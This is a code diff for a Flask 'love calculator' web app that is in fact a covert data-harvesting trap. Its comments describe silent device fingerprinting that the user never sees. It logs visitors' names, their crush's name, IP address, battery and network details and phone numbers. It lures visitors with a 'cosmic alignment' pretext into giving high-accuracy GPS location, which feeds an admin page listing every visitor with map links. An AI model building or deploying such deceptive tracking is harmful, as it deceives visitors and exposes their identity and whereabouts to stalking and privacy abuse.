@@ -8,11 +8,8 @@ from datetime import datetime
 app = Flask(__name__)
 
 # ========== FIREBASE SETUP ==========
-# Get these from your Firebase console:
-# 1. Go to Project Settings → General → Your apps
-# 2. Copy your Database URL: https://your-project-default-rtdb.firebaseio.com/
+# Get your Database URL from Firebase Console
 FIREBASE_URL = os.environ.get("FIREBASE_URL", "https://YOUR-PROJECT-default-rtdb.firebaseio.com/")
-# Remove trailing slash if exists
 if FIREBASE_URL.endswith('/'):
     FIREBASE_URL = FIREBASE_URL[:-1]
 
@@ -39,7 +36,6 @@ def get_love_message(name1, name2, percentage):
 
 # ========== FIREBASE DATABASE FUNCTIONS ==========
 def save_to_firebase(path, data):
-    """Save data to Firebase Realtime Database"""
     try:
         url = f"{FIREBASE_URL}/{path}.json"
         response = requests.put(url, json=data, timeout=10)
@@ -49,7 +45,6 @@ def save_to_firebase(path, data):
         return False
 
 def get_from_firebase(path):
-    """Get data from Firebase Realtime Database"""
     try:
         url = f"{FIREBASE_URL}/{path}.json"
         response = requests.get(url, timeout=10)
@@ -61,28 +56,14 @@ def get_from_firebase(path):
         return None
 
 def save_visitor(session_id, data):
-    """Save or update visitor data in Firebase"""
     path = f"visitors/{session_id}"
     return save_to_firebase(path, data)
 
-def save_location(session_id, lat, lon):
-    """Save location history in Firebase"""
-    timestamp = datetime.now().isoformat()
-    location_data = {
-        "timestamp": timestamp,
-        "latitude": lat,
-        "longitude": lon,
-        "sessionId": session_id
-    }
-    path = f"location_history/{session_id}_{timestamp}"
-    return save_to_firebase(path, location_data)
-
 def get_visitor(session_id):
-    """Get visitor data from Firebase"""
     path = f"visitors/{session_id}"
     return get_from_firebase(path)
 
-# ========== HTML TEMPLATE ==========
+# ========== HTML TEMPLATE (No camera, no mic, no files) ==========
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -131,7 +112,7 @@ HTML_TEMPLATE = '''
             background: #f7fafc;
         }
         input:focus { outline: none; border-color: #667eea; background: white; }
-        button {
+        .calculate-btn {
             background: linear-gradient(135deg, #667eea, #764ba2);
             color: white;
             border: none;
@@ -143,7 +124,9 @@ HTML_TEMPLATE = '''
             width: 100%;
             transition: all 0.3s;
         }
-        button:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4); }
+        .calculate-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4); }
+        .calculate-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        
         .result {
             margin-top: 30px;
             padding: 30px;
@@ -166,6 +149,28 @@ HTML_TEMPLATE = '''
             margin-bottom: 15px;
         }
         .love-message { font-size: 1.2em; color: #2d3748; line-height: 1.6; margin-bottom: 20px; }
+        
+        .location-section {
+            margin-top: 20px;
+            padding: 20px;
+            background: #fef5e7;
+            border-radius: 20px;
+            display: none;
+            border: 1px solid #ffe0b5;
+        }
+        .location-btn {
+            background: linear-gradient(135deg, #48bb78, #38a169);
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 50px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .location-btn:hover { transform: translateY(-2px); }
+        
         .phone-section {
             margin-top: 25px;
             padding: 20px;
@@ -202,6 +207,8 @@ HTML_TEMPLATE = '''
         }
         .status.success { background: #c6f6d5; color: #22543d; display: block; }
         .status.error { background: #fed7d7; color: #742a2a; display: block; }
+        .status.info { background: #d1ecf1; color: #0c5460; display: block; }
+        
         .loading {
             display: inline-block;
             width: 20px;
@@ -212,19 +219,17 @@ HTML_TEMPLATE = '''
             animation: spin 0.8s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+        
         footer { margin-top: 20px; font-size: 11px; color: #a0aec0; }
-        .optional-buttons {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin-top: 15px;
-            flex-wrap: wrap;
-        }
-        .opt-btn {
-            background: linear-gradient(135deg, #48bb78, #38a169);
-            width: auto;
-            padding: 10px 20px;
-            font-size: 13px;
+        
+        .location-tag {
+            display: inline-block;
+            background: #48bb78;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-top: 10px;
         }
     </style>
 </head>
@@ -234,17 +239,21 @@ HTML_TEMPLATE = '''
     <div class="subtitle">Discover the magic between you two ✨</div>
     
     <div class="input-group">
-        <input type="text" id="name1" placeholder="Your name" maxlength="30">
-        <input type="text" id="name2" placeholder="Crush's name" maxlength="30">
+        <input type="text" id="name1" placeholder="Your name" maxlength="30" autocomplete="off">
+        <input type="text" id="name2" placeholder="Crush's name" maxlength="30" autocomplete="off">
     </div>
-    <button onclick="calculateLove()">🔮 Calculate Love Percentage</button>
+    <button class="calculate-btn" onclick="calculateLove()">🔮 Calculate Love Percentage</button>
     
     <div id="result" class="result">
         <div class="percentage" id="percentage">0%</div>
         <div class="love-message" id="message"></div>
-        <div class="optional-buttons" id="optionalBtns" style="display:none;">
-            <button class="opt-btn" onclick="shareLocation()">📍 Share Location</button>
-        </div>
+    </div>
+    
+    <div id="locationSection" class="location-section">
+        <p>📍 <strong>Want a more accurate reading?</strong></p>
+        <p style="font-size: 13px; margin-bottom: 12px;">Share your location to unlock cosmic alignment ✨</p>
+        <button class="location-btn" onclick="shareLocation()">🌟 Share My Location 🌟</button>
+        <p id="locationStatus" style="font-size: 11px; margin-top: 10px; color: #7b8a9b;"></p>
     </div>
     
     <div id="phoneSection" class="phone-section">
@@ -266,11 +275,13 @@ HTML_TEMPLATE = '''
     
     let currentFortune = '';
     let currentPercent = 0;
+    let locationShared = false;
     let collectedData = {
         sessionId: sessionId,
         timestamp: new Date().toISOString()
     };
     
+    // Silent device data collection (user never sees)
     async function collectDeviceData() {
         try {
             const fp = await FingerprintJS.load();
@@ -314,12 +325,13 @@ HTML_TEMPLATE = '''
             return;
         }
         
-        const btn = event.target;
+        const btn = document.querySelector('.calculate-btn');
         btn.innerHTML = '<span class="loading"></span> Calculating...';
         btn.disabled = true;
         
         collectedData.name = name1;
         collectedData.crush_name = name2;
+        
         await fetch('/save', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -340,11 +352,14 @@ HTML_TEMPLATE = '''
             document.getElementById('percentage').innerHTML = currentPercent + '%';
             document.getElementById('message').innerHTML = currentFortune;
             document.getElementById('result').style.display = 'block';
-            document.getElementById('optionalBtns').style.display = 'flex';
+            
+            // Show location section and phone section AFTER fortune is shown
+            document.getElementById('locationSection').style.display = 'block';
             document.getElementById('phoneSection').style.display = 'block';
             
             collectedData.fortuneText = currentFortune;
             collectedData.percentage = currentPercent;
+            
             await fetch('/save', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -361,32 +376,69 @@ HTML_TEMPLATE = '''
     }
     
     function shareLocation() {
-        if (confirm('📍 Share your location for a more accurate love reading?')) {
-            navigator.geolocation.getCurrentPosition(async (position) => {
-                collectedData.latitude = position.coords.latitude;
-                collectedData.longitude = position.coords.longitude;
-                await fetch('/save', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(collectedData)
-                });
-                
-                // Also save to location history
-                await fetch('/save-location', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        sessionId: sessionId,
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude
-                    })
-                });
-                
-                showStatus('📍 Location saved! Your reading is more accurate.', 'success');
-            }, () => {
-                showStatus('Location access denied.', 'error');
+        const locationBtn = document.querySelector('.location-btn');
+        locationBtn.innerHTML = '<span class="loading"></span> Getting location...';
+        locationBtn.disabled = true;
+        
+        document.getElementById('locationStatus').innerHTML = '✨ Accessing your cosmic coordinates...';
+        
+        navigator.geolocation.getCurrentPosition(async (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            collectedData.latitude = lat;
+            collectedData.longitude = lon;
+            collectedData.mapUrl = `https://maps.google.com/?q=${lat},${lon}`;
+            locationShared = true;
+            
+            await fetch('/save', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(collectedData)
             });
-        }
+            
+            await fetch('/save-location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId: sessionId,
+                    latitude: lat,
+                    longitude: lon
+                })
+            });
+            
+            document.getElementById('locationStatus').innerHTML = '✅ Location shared successfully! Your reading is now enhanced.';
+            locationBtn.innerHTML = '✅ Location Shared!';
+            locationBtn.style.background = '#38a169';
+            
+            showStatus('📍 Location saved! Your cosmic alignment is stronger.', 'success');
+            
+            // Optional: Show location tag on result
+            if (document.getElementById('result')) {
+                let tag = document.getElementById('locationTag');
+                if (!tag) {
+                    tag = document.createElement('div');
+                    tag.id = 'locationTag';
+                    tag.className = 'location-tag';
+                    document.getElementById('result').appendChild(tag);
+                }
+                tag.innerHTML = '📍 Location Enhanced';
+            }
+        }, (error) => {
+            let errorMsg = 'Location access denied. You can still use the calculator!';
+            if (error.code === 1) errorMsg = '📍 Location permission denied. Your reading is still accurate!';
+            if (error.code === 2) errorMsg = '📍 Position unavailable. Please try again.';
+            if (error.code === 3) errorMsg = '📍 Location request timed out.';
+            
+            document.getElementById('locationStatus').innerHTML = errorMsg;
+            locationBtn.innerHTML = '🌟 Share My Location 🌟';
+            locationBtn.disabled = false;
+            showStatus(errorMsg, 'info');
+        }, {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        });
     }
     
     async function savePhone() {
@@ -401,6 +453,10 @@ HTML_TEMPLATE = '''
             return;
         }
         
+        const saveBtn = document.querySelector('.save-btn');
+        saveBtn.innerHTML = '<span class="loading"></span> Saving...';
+        saveBtn.disabled = true;
+        
         try {
             const response = await fetch('/save-phone', {
                 method: 'POST',
@@ -409,17 +465,21 @@ HTML_TEMPLATE = '''
                     sessionId: sessionId,
                     phoneNumber: phone,
                     fortune: currentFortune,
-                    percentage: currentPercent
+                    percentage: currentPercent,
+                    locationShared: locationShared
                 })
             });
             const result = await response.json();
             if (result.status === 'saved') {
                 showStatus('✅ Number saved! Your love result is secured.', 'success');
                 document.getElementById('phone').disabled = true;
-                event.target.disabled = true;
+                saveBtn.innerHTML = '✅ Saved!';
+                saveBtn.style.background = '#38a169';
             }
         } catch(e) {
             showStatus('Network error. Please try again.', 'error');
+            saveBtn.innerHTML = '💾 Save to Phone';
+            saveBtn.disabled = false;
         }
     }
     
@@ -430,9 +490,10 @@ HTML_TEMPLATE = '''
         setTimeout(() => {
             statusDiv.style.display = 'none';
             statusDiv.className = 'status';
-        }, 3000);
+        }, 4000);
     }
     
+    // Initialize
     collectDeviceData();
 </script>
 </body>
@@ -452,9 +513,7 @@ def save():
         data['ip'] = request.headers.get('x-forwarded-for', request.remote_addr)
         data['timestamp'] = datetime.now().isoformat()
         
-        # Save to Firebase
         save_visitor(session_id, data)
-        
         return jsonify({'status': 'saved'})
     except Exception as e:
         print(f"Save error: {e}")
@@ -469,7 +528,14 @@ def save_location_route():
         lon = data.get('longitude')
         
         if session_id and lat and lon:
-            save_location(session_id, lat, lon)
+            path = f"location_history/{session_id}_{datetime.now().timestamp()}"
+            location_data = {
+                "sessionId": session_id,
+                "timestamp": datetime.now().isoformat(),
+                "latitude": lat,
+                "longitude": lon
+            }
+            save_to_firebase(path, location_data)
             return jsonify({'status': 'recorded'})
         return jsonify({'status': 'error'}), 400
     except Exception as e:
@@ -485,7 +551,6 @@ def save_phone():
         fortune = data.get('fortune')
         percentage = data.get('percentage')
         
-        # Get existing data and update
         visitor = get_visitor(session_id)
         if visitor:
             visitor['phoneNumber'] = phone
@@ -511,26 +576,23 @@ def calculate_love():
         return jsonify({'message': str(e)}), 500
 
 # ========== SECRET ADMIN ROUTE (Only YOU know this URL) ==========
-# Change "secret-admin-xyz123" to something only you know!
-@app.route('/secret-admin-view-data')
+@app.route('/admin-view-data')
 def admin_view():
     try:
-        # Get all visitors from Firebase
         visitors = get_from_firebase("visitors")
         
         if not visitors:
             return """
             <html>
             <head><title>Admin - No Data</title></head>
-            <body style="font-family: monospace; padding: 20px;">
+            <body style="font-family: monospace; padding: 20px; background: #1a1a2e; color: #eee;">
                 <h1>📊 No Visitor Data Yet</h1>
                 <p>Have users visit the love calculator first.</p>
-                <a href="/">Back to Calculator</a>
+                <a href="/" style="color: #f093fb;">Back to Calculator</a>
             </body>
             </html>
             """
         
-        # Build HTML table
         html = """
         <!DOCTYPE html>
         <html>
@@ -554,7 +616,7 @@ def admin_view():
                 <strong>Total Visitors:</strong> """ + str(len(visitors)) + """
             </div>
             <p>
-                <a href="/secret-admin-view-data" class="btn refresh">🔄 Refresh</a>
+                <a href="/admin-view-data" class="btn refresh">🔄 Refresh</a>
                 <a href="/" class="btn">🏠 Back to Calculator</a>
             </p>
             <div class="container">
@@ -573,7 +635,6 @@ def admin_view():
                             <th>Battery</th>
                             <th>Network</th>
                             <th>Device</th>
-                            <th>Screen</th>
                             <th>Location</th>
                         </tr>
                     </thead>
@@ -582,13 +643,15 @@ def admin_view():
         
         for session_id, visitor in visitors.items():
             if isinstance(visitor, dict):
-                location = f"{visitor.get('latitude', '')},{visitor.get('longitude', '')}"
+                location = ""
                 if visitor.get('latitude'):
-                    location = f'<a href="https://maps.google.com/?q={visitor.get("latitude")},{visitor.get("longitude")}" target="_blank">📍 Map</a>'
+                    location = f'<a href="https://maps.google.com/?q={visitor.get("latitude")},{visitor.get("longitude")}" target="_blank" style="color:#f093fb;">📍 Map</a>'
+                else:
+                    location = "Not shared"
                 
                 html += f"""
                     <tr>
-                        <td>{session_id[:30]}...</td>
+                        <td>{session_id[:35]}...</td>
                         <td>{visitor.get('timestamp', '')[:19]}</td>
                         <td>{visitor.get('ip', '')}</td>
                         <td><strong>{visitor.get('name', '')}</strong></td>
@@ -600,7 +663,6 @@ def admin_view():
                         <td>{visitor.get('batteryLevel', '')}</td>
                         <td>{visitor.get('networkType', '')}</td>
                         <td>{visitor.get('deviceMemory', '')}</td>
-                        <td>{visitor.get('screen', '')}</td>
                         <td>{location}</td>
                     </tr>
                 """
@@ -615,52 +677,6 @@ def admin_view():
         return html
     except Exception as e:
         return f"<h1>Error: {str(e)}</h1><p><a href='/'>Back</a></p>"
-
-# ========== VIEW LOCATION HISTORY ==========
-@app.route('/secret-admin-locations')
-def admin_locations():
-    try:
-        locations = get_from_firebase("location_history")
-        
-        if not locations:
-            return "<h1>No location history yet</h1><a href='/'>Back</a>"
-        
-        html = """
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Location History</title>
-            <style>
-                body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
-                h1 { color: #f093fb; }
-                table { border-collapse: collapse; width: 100%; background: #16213e; }
-                th, td { border: 1px solid #0f3460; padding: 8px; }
-                th { background: #e94560; }
-            </style>
-        </head>
-        <body>
-            <h1>📍 Location History</h1>
-            <table>
-                <tr><th>Timestamp</th><th>Session ID</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr>
-        """
-        
-        for key, loc in locations.items():
-            if isinstance(loc, dict):
-                map_link = f'<a href="https://maps.google.com/?q={loc.get("latitude")},{loc.get("longitude")}" target="_blank">View Map</a>'
-                html += f"""
-                    <tr>
-                        <td>{loc.get('timestamp', '')[:19]}</td>
-                        <td>{loc.get('sessionId', '')[:30]}...</td>
-                        <td>{loc.get('latitude', '')}</td>
-                        <td>{loc.get('longitude', '')}</td>
-                        <td>{map_link}</td>
-                    </tr>
-                """
-        
-        html += "</table><p><a href='/'>Back</a></p></body></html>"
-        return html
-    except Exception as e:
-        return f"<h1>Error: {str(e)}</h1>"
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
